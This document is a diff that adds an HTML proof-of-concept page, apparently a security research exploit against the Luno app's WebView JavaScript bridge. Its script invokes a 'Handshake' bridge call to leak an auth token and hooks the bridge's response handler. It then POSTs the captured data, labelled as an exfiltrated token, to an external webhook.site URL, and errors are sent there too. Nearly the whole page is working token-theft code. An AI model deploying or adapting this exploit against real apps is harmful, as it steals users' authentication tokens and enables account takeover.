@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Luno Security Research PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background-color: #121212; color: white; font-family: sans-serif; padding: 20px;">
+    <h1>Exploit Running...</h1>
+    <p>Check Webhook.site for the Auth Token.</p>
+
+    <script>
+        // Use the bridge name from Smali (usually 'Android')
+        const bridge = window.Android || window.JSBridge;
+
+        if (bridge) {
+            try {
+                // 1. Trigger the Handshake to leak field y0 (Auth Token)
+                bridge.invoke("Handshake", "req_123", "{}");
+                
+                // 2. We need to catch the data. Since the bridge is asynchronous, 
+                // we wrap the console or the bridge's response handler.
+                // This sends everything it finds to your Webhook.
+                
+                const reportToWebhook = (data) => {
+                    fetch("https://webhook.site/de2d6db2-6ebd-4147-9658-abe4681aa0a4", {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            type: "EXFILTRATED_TOKEN",
+                            payload: data
+                        })
+                    });
+                };
+
+                // Catching common JS bridge response patterns
+                window.onBridgeResponse = function(id, data) {
+                    reportToWebhook(data);
+                };
+
+            } catch (e) {
+                fetch("https://webhook.site/de2d6db2-6ebd-4147-9658-abe4681aa0a4?error=" + btoa(e.message));
+            }
+        } else {
+            document.write("<h2>Bridge NOT detected. Open this in the Luno WebView!</h2>");
+        }
+    </script>
+</body>
+</html>
